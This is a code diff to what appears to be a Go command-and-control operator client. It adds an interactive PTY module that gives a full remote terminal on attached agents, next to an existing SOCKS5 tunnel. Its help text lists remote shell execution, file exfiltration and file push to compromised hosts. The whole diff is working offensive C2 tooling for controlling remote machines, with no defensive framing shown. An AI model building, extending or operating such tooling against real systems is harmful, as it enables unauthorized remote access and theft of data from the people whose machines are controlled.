@@ -396,6 +396,8 @@ func (op *Operator) pollResultsLive(ctx context.Context) (map[int]map[string]int
 			}
 		} else if op.routeTunnelLocked(result) {
 			// consumed by the SOCKS5 tunnel
+		} else if op.routePtyLocked(result) {
+			// consumed by the interactive PTY client
 		} else {
 			results[seq] = result
 			status, _ := result["status"].(string)
@@ -424,6 +426,26 @@ func (op *Operator) routeTunnelLocked(result map[string]interface{}) bool {
 	}
 	if frame, ok := FrameFromResult(result); ok {
 		if ch := op.TunnelFrameCh(); ch != nil {
+			select {
+			case ch <- frame:
+			default:
+			}
+		}
+	}
+	return true
+}
+
+// routePtyLocked intercepts module=="pty" results and feeds them to the
+// interactive PTY client. Returns true if the result was a pty frame
+// (consumed — skip normal result handling). Caller must hold op.mu.
+// Never blocks the poller: frames are dropped if the client isn't draining.
+func (op *Operator) routePtyLocked(result map[string]interface{}) bool {
+	module, _ := result["module"].(string)
+	if module != "pty" {
+		return false
+	}
+	if frame, ok := PtyFrameFromResult(result); ok {
+		if ch := op.PtyFrameCh(); ch != nil {
 			select {
 			case ch <- frame:
 			default:
@@ -513,6 +535,9 @@ func (op *Operator) pollResultsClassic(ctx context.Context) (map[int]map[string]
 			if op.routeTunnelLocked(result) {
 				continue
 			}
+			if op.routePtyLocked(result) {
+				continue
+			}
 			results[seqNum] = result
 			status, _ := result["status"].(string)
 			data, _ := result["data"].(string)
@@ -541,6 +566,10 @@ func (op *Operator) pollResultsClassic(ctx context.Context) (map[int]map[string]
 			continue
 		}
 		if op.routeTunnelLocked(result) {
+			cleanups = append(cleanups, seqNum)
+			continue
+		}
+		if op.routePtyLocked(result) {
 			cleanups = append(cleanups, seqNum)
 			continue
 		}
@@ -736,6 +765,7 @@ func (op *Operator) Interactive() {
 	defer func() {
 		close(stopCh)
 		op.StopTunnel()
+		op.StopPty()
 		op.sendShutdown()
 		op.FlushHistory()
 		op.WipeKeys()
@@ -854,6 +884,13 @@ func (op *Operator) Interactive() {
 				continue
 			}
 			op.interactiveShell()
+		case "pty":
+			if !op.requireAttached() {
+				continue
+			}
+			if err := op.StartPty(); err != nil {
+				fmt.Printf("[!] PTY failed: %v\n", err)
+			}
 		case "results":
 			results, err := op.PollResults()
 			if err != nil {
@@ -1483,7 +1520,8 @@ Agent management:
   detach          Detach from current agent
 
 Commands (requires attached agent):
-  ishell          Interactive remote shell (auto-detects bash/powershell)
+  pty             Full interactive terminal (real PTY: tab-complete, vim, top)
+  ishell          Line-based remote shell (lighter; auto-detects bash/powershell)
   shell <cmd>     Execute a single shell command
   exfil <path>    Exfiltrate a file
   push <l> <r>    Push local file <l> to remote path <r>
